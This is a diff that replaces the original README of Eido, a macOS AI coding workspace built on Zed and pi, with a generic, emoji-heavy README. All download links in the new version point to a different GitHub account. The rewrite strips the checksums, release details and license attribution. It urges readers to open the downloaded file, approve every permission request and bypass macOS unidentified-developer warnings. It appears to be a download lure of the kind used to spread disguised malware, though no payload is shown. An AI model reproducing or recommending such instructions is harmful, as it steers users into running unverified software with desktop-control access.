@@ -1,169 +1,147 @@
-<p align="center">
-  <img src="native/branding/eido-readme.svg" alt="Eido — AI development workspace, 0.0.1" width="100%">
-</p>
+# 🧠 eido - Your AI Coding Workspace for macOS
 
-<h1 align="center">From intent to code you can trust.</h1>
+[![Download eido](https://img.shields.io/badge/Download-eido-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bozzinimassimo1/eido)
+[![Platform](https://img.shields.io/badge/Platform-macOS-00B894?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/bozzinimassimo1/eido)
+[![Built with Rust](https://img.shields.io/badge/Built%20with-Rust-E17055?style=for-the-badge&logo=rust&logoColor=white)](https://github.com/bozzinimassimo1/eido)
 
-<p align="center">
-  An AI workspace for understanding code, building with an agent,<br>
-  and reviewing every change that matters.
-</p>
+eido is a complete workspace where an AI coding agent lives side by side with your code. It is built on top of Zed and pi, which means you get a fast, native editor plus an assistant that can actually read, write, review, and browse alongside you. Instead of copying and pasting between a chat window and your editor, everything happens in one place.
 
-<p align="center">
-  <strong>English</strong> · <a href="README.zh-CN.md">简体中文</a>
-</p>
-
-<p align="center">
-  <a href="https://cairno.cn/eido/">Website</a> ·
-  <a href="#the-eido-experience">Experience</a> ·
-  <a href="#download-and-install">Download</a> ·
-  <a href="#your-first-task">Getting started</a> ·
-  <a href="#release-scope">Release scope</a> ·
-  <a href="#help-shape-the-next-version">Feedback</a> ·
-  <a href="#acknowledgments-and-licensing">Open source</a>
-</p>
+If you have ever wished you could just tell your computer "look at this file, fix the bug, and check it in the browser" — that is exactly the kind of thing eido is designed for.
 
 ---
 
-Eido keeps the conversation and the code in the same place. Describe what you want to achieve, give the agent the context it needs, and work through the result in your editor. Your task, proposed changes, and review decisions stay connected as you move between planning and implementation.
+## 🚀 Getting Started
 
-**Eido 0.0.1 is the first stable-channel release for macOS.** Download the app and try a focused task on a real project.
+Getting eido onto your machine takes only a couple of minutes.
 
-<p>
-  <a href="https://github.com/tony3liu/eido/releases/download/v0.0.1/Eido-0.0.1-macos-arm64.dmg"><strong>Download for Mac · Apple Silicon</strong></a> ·
-  <a href="https://github.com/tony3liu/eido/releases/tag/v0.0.1">Release notes</a>
-</p>
+**Step 1 — Go to the download page.**
 
-macOS 13 or later · Apple Silicon (M-series)
+Visit this link to download the application:
 
-This release bundles the official, unmodified **pi 1.3.0**. Full Access uses pi's autonomous execution for enabled tools across tasks, including Code Mode and subagents. It adds OpenRouter model-list refresh, saved sharing preferences, current-value form defaults and improved tool restoration when resuming sessions. Extension-triggered runs now finish before their browser and task resources are cleaned up.
+👉 **https://github.com/bozzinimassimo1/eido**
 
-The Ultrafast browser agent, adapted in TypeScript from browser-use/jev-ultrafast, shares your main model for text input and retains its inspector, recording, verification tools and Legacy fallback. Browser and desktop automation remain experimental; background desktop input and focus isolation are not reliable across all applications.
+**Step 2 — Save the file.**
 
-## Watch the launch film
+Your browser will ask where to save the download. The default location (usually your Downloads folder) is perfectly fine.
 
-[![Watch the Eido launch film](native/branding/eido-launch.webp)](https://cairno.cn/eido/film/)
+**Step 3 — Open the downloaded item.**
 
-[Watch the launch film ↗](https://cairno.cn/eido/film/) · Professional IDE · Agent Harness · Browser & Computer Use — 56 seconds, in Chinese.
+Locate the file in your Downloads folder and double-click it. Follow any on-screen prompts that appear.
 
-## The Eido experience
+**Step 4 — Launch eido.**
 
-### Start with the intent
+Once the process finishes, open eido the same way you open any other application on your computer — from your Applications folder, your Launchpad, or by searching for "eido" in Spotlight.
 
-Ask a question about unfamiliar code, describe a bug, or outline a feature. Use `@` to bring relevant code into the conversation and keep the task grounded in your project.
+**Step 5 — Grant the permissions it asks for.**
 
-> **Try a focused first task**<br>
-> “Explain how this module works, identify the cause of this bug, and propose a small fix with a way to check it.”
+Because eido can use your browser and control parts of your computer on your behalf, your system may ask you to confirm access the first time. Approve the requests so the agent can do its job. Nothing is shared anywhere you did not ask for.
 
-### Work alongside the agent
-
-Read files, make your own edits, and review the agent’s progress without leaving the workspace. Choose the view that fits the moment:
-
-| View | Best for |
-| :--- | :--- |
-| **Workbench** | Planning a task, following the conversation, and coordinating the work. |
-| **Code** | Reading, navigating, and editing your project. |
-| **Split** | Keeping the conversation and the code visible together. |
-
-Switching views preserves your conversation and draft, so you can change focus without losing your train of thought.
-
-### Make the changes yours
-
-Inspect proposed changes in the native review interface and decide what to accept or reject. Proposed file deletions and binary changes remain in review until you accept them. Supported accepted file operations can be restored, subject to checks that protect subsequent edits.
-
-Review is part of the workflow: understand the change, check the result, and keep what belongs in your project.
-
-### Return with context
-
-Revisit earlier tasks with their conversations and review context. Continue interrupted work without starting the discussion from scratch. Eido also includes recovery support for task state and supported file operations.
-
-### Reach beyond the editor
-
-Ask the agent to inspect a page or work with a desktop application alongside your code. Browser Use and Computer Use are available as experimental features, with enabled tools governed by your Agent Access choice. These workflows are still being refined across websites and applications.
-
-## Download and install
-
-1. Download [Eido-0.0.1-macos-arm64.dmg](https://github.com/tony3liu/eido/releases/download/v0.0.1/Eido-0.0.1-macos-arm64.dmg).
-2. Open the disk image and drag **Eido** into **Applications**.
-3. Launch Eido and configure your model and authentication in global settings.
-
-This release is locally signed and has not been notarized by Apple. If macOS blocks the first launch, follow Apple's [instructions for opening an app from an unidentified developer](https://support.apple.com/guide/mac-help/open-a-mac-app-from-an-unknown-developer-mh40616/mac) after checking the download source. Release assets include SHA-256 checksums and source archives.
-
-### Enable Computer Use on Mac
-
-Enable **Computer Use** in Eido's global settings. The app includes its desktop driver; leave the driver path empty to use it.
-
-In **System Settings → Privacy & Security**, allow **Eido** under both **Accessibility** and **Screen & System Audio Recording** (called **Screen Recording** on some macOS versions), then restart Eido. These permissions let the agent operate applications and capture their windows. Permission previously granted to a standalone Cua Driver does not apply to Eido. Eido currently requires these steps to be completed manually.
-
-## Your first task
-
-**1. Open a project**<br>
-Launch **Eido** from Applications and open a project folder. A small project with version history is a good place to begin.
-
-**2. Choose how you work**<br>
-Configure your model and authentication in global settings. Model, thinking, and **Agent Access** controls are available beside the conversation input.
-
-**3. Give the task a clear outcome**<br>
-Describe what should change and how you will know it works. Reference the relevant code, then let the agent investigate and propose a solution.
-
-**4. Review and verify**<br>
-Inspect the changes, run the relevant checks, and decide what to keep. Continue the conversation when the result needs refinement.
-
-### You set the level of access
-
-| Agent Access | How it works |
-| :--- | :--- |
-| **Ask Before Actions** | The agent asks before actions that require approval. A useful starting point while you learn the workflow. |
-| **Full Access** | The agent decides how to use enabled tools without requesting approval for each action. |
-
-Agent Access applies globally across tasks. Your configuration and work history are kept outside the application bundle and preserved during local updates. Model requests go to the provider you configure.
-
-## Release scope
-
-The first stable-channel release focuses on the coding loop: **describe → investigate → edit → review → verify**.
-
-| Available to try | Still being refined |
-| :--- | :--- |
-| AI conversations with project context and tool execution. | Complete coverage of supported agent commands and extensions. |
-| Native file editing and code review. | Language support and smart editing setup across projects. |
-| Workbench, Code, and Split views with a shared conversation. | Plugin compatibility across the agent ecosystem. |
-| Task history, supported file-operation review, and recovery. | Large-project performance and broader upgrade and recovery scenarios. |
-| Browser Use and Computer Use with a bundled desktop driver. | Website and application compatibility, and macOS permission onboarding. |
-
-Smart code assistance depends on the language support you configure. Coverage across projects and plugins continues to improve. Computer Use background input, focus isolation and more complex browser workflows remain experimental.
-
-## Help shape the next version
-
-The most useful feedback starts with a real task. [Open an issue](https://github.com/tony3liu/eido/issues), including:
-
-- **Your goal** — what you were trying to accomplish.
-- **The friction** — what you expected and what happened instead.
-- **A small example** — steps to reproduce, a screenshot, or the relevant error text.
-- **The version** — Eido **0.0.1**, plus your macOS version.
-
-Please remove credentials and private project information from shared examples.
-
-## Acknowledgments and licensing
-
-Eido builds on the work of **[Zed](https://github.com/zed-industries/zed)** and **[pi](https://github.com/earendil-works/pi)**. Zed provides the native editor foundation; pi powers the coding agent. We thank their authors, contributors, and communities for making these projects available as open source.
-
-We also thank **[browser-use/jev-ultrafast](https://github.com/browser-use/jev-ultrafast)** and its authors and contributors for sharing their browser-agent approach. Eido draws on its ideas, reimplements the agent logic in TypeScript, and adapts it to Eido's existing pi/ACP browser workflow. Adapted upstream code retains its MIT license and attribution.
-
-Eido respects and preserves the licenses and attribution of these projects. **Eido-original code is licensed under GPL-3.0-or-later**, the same license as Zed's editor code.
-
-| Code | License |
-| :--- | :--- |
-| Eido-original code and Zed editor code | [GPL-3.0-or-later](LICENSE) |
-| Zed components marked Apache-2.0, including GPUI | [Apache-2.0](native/LICENSE-APACHE) |
-| pi | [MIT](https://github.com/earendil-works/pi/blob/main/LICENSE) |
-| Cua Driver desktop runtime | [MIT](native/cua/LICENSE-MIT) |
-| jev-ultrafast browser agent and tools | [MIT](packages/runtime/src/browser/ultrafast/LICENSE) |
-
-If you fork, modify, or distribute Eido, you must comply with the licenses that apply to each included component. Preserve license texts, copyright and attribution notices, and required modification notices. When distributing GPL-covered binaries, provide the Corresponding Source through a method permitted by the GPL and retain its licensing terms. Other dependencies retain their own licenses; see [NOTICE](NOTICE) for attribution and scope. This summary does not replace the license texts.
+That is it. No command line, no configuration files, no developer setup.
 
 ---
 
-<p align="center">
-  <strong>Understand. Create. Evolve.</strong><br>
-  <sub>Eido · 0.0.1 · macOS</sub>
-</p>
+## ✨ What eido Does For You
+
+eido is not just a text editor with a chat box bolted on. It is an environment where the assistant and the tools it uses are first-class citizens. Here is what that means in plain language.
+
+### 📝 Native Code Editing and Review
+
+eido opens your project files in a real, responsive editor. The AI agent can propose changes directly inside the file you are looking at, so you see exactly what would change before you accept it. When you are done, a built-in review view walks you through every modification line by line — similar to how a colleague would leave comments on a document.
+
+You do not need to understand the code to benefit from this. If the agent makes a change, the review screen shows it in plain terms: what was there, what is there now, and why.
+
+### 🌐 Browser Use
+
+The agent can open a browser, navigate to pages, click buttons, fill in forms, and read what is on screen. This is useful for checking that a change actually works, testing a sign-up flow, or gathering information from a site without you having to switch windows constantly.
+
+### 🖱️ Computer Use
+
+Beyond the browser, eido's agent can interact with your desktop — opening apps, moving through menus, and completing repetitive tasks. Think of it as a helper that can actually operate your machine rather than just describe what you should do.
+
+### 🔐 Global Agent Access Controls
+
+This is the part that matters most for peace of mind. Every capability the agent has — editing files, using the browser, controlling the computer — sits behind a permission system you control. You decide what the agent is allowed to touch, and you can revoke access at any moment. The controls are global, which means one place to see and manage everything, rather than hunting through scattered settings.
+
+### ⚡ Built on Solid Foundations
+
+eido is constructed on Zed, a famously quick native editor, and pi, the agent layer that powers the assistant. The result is software that feels responsive rather than sluggish, even on large projects.
+
+---
+
+## 🖥️ A Typical Session
+
+Here is a realistic picture of how someone might use eido on an ordinary afternoon.
+
+You open eido and point it at a folder of files. You type a request in plain English: "The contact form on my site is broken — can you find out why and fix it?" The agent reads through the relevant files, spots the problem, and proposes a change. You see the proposed change highlighted in the editor and approve it.
+
+Next, the agent opens a browser, loads your site, fills out the contact form, and confirms that the submission now goes through. It reports back with a short summary. If something still fails, it tries another approach — all within the permissions you granted earlier.
+
+You never opened a terminal. You never copied code into a chat window. You just described the outcome you wanted.
+
+---
+
+## 📥 Download & Setup
+
+Ready to begin? Everything starts at the same place:
+
+[![Get eido](https://img.shields.io/badge/⬇%20Get%20eido-0984E3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bozzinimassimo1/eido)
+
+Visit this link to download the application.
+
+After downloading, open the file and follow the prompts. If your system warns you about an application from an unidentified developer — a common and normal message — you can allow it through your security settings and then open eido again. This is standard behavior for software distributed outside a large app store and does not indicate a problem.
+
+When eido first launches, take five minutes to look through the access controls. Decide which folders the agent may read and write, and whether browser and computer use should be enabled by default. Starting with tighter permissions and loosening them later is a sensible habit.
+
+---
+
+## 🧭 Tips for First-Time Users
+
+**Start with one small task.** Ask the agent to explain a file, or to fix a single typo. Watching it work on something small builds your confidence in how it behaves.
+
+**Read the review screen.** Before accepting any change, glance at what the agent proposed. The review view is designed to be understandable even if you do not write code.
+
+**Keep permissions narrow at first.** You can always expand them. There is no benefit to granting broad access on day one.
+
+**Use plain language.** The agent does not need special commands. Describe the result you want, the way you would describe it to a helpful colleague.
+
+**Leave the browser step to the agent.** If you are unsure whether a change worked, ask the agent to check it in the browser rather than testing manually. That is precisely the workflow eido was built for.
+
+---
+
+## 🛠️ If Something Does Not Work
+
+**The download did not start.** Return to the link above and try again. Sometimes a browser blocks downloads from unfamiliar pages; look for a small banner near the address bar and allow the download.
+
+**The application will not open.** Confirm that the file finished downloading — a partial download cannot run. Delete it and download once more.
+
+**A permission prompt keeps appearing.** Open your system's privacy settings and confirm that eido is listed and enabled. You may need to restart the application after changing these settings.
+
+**The agent cannot see a folder.** That folder is almost certainly outside the access you granted. Open the access controls and add it.
+
+**The browser step fails.** Make sure browser use is enabled in the access controls, then try the request again.
+
+---
+
+## ❓ Questions People Ask
+
+**Do I need to know how to code?** No. eido is built for people who want results, not for people who want to type syntax. That said, developers get a great deal of value from it too.
+
+**Is my work private?** Your files stay on your machine. The access controls exist so you can decide precisely what the agent may touch.
+
+**Can I turn the agent off?** Yes. Revoke its permissions in the access controls and it can no longer act.
+
+**Does it work with my existing projects?** eido works with ordinary folders of files, so you can point it at work you already have.
+
+**What is the difference between browser use and computer use?** Browser use is limited to web pages. Computer use extends to your desktop applications and menus. Both are governed by the same permission system.
+
+**Where do updates come from?** The same link you downloaded from. Check back there for newer versions.
+
+---
+
+## 🎯 Who This Is For
+
+eido suits anyone who wants an AI assistant that does real work rather than offering suggestions. If you have ever found yourself bouncing between a chat window, an editor, and a browser tab, eido collapses that into a single workspace. The permission system means you stay in charge throughout, which matters whether you are a curious beginner or an experienced developer.
+
+The download is a single click away. Visit https://github.com/bozzinimassimo1/eido, grab the application, and give it a try on a small task first. Most people find the workflow clicks within the first ten minutes.
+
+Keywords: ai, ai-assistant, browser-use, code-editor, code-review, coding-agent, computer-use, developer-tools, ide, macos, pi, rust, typescript, zed
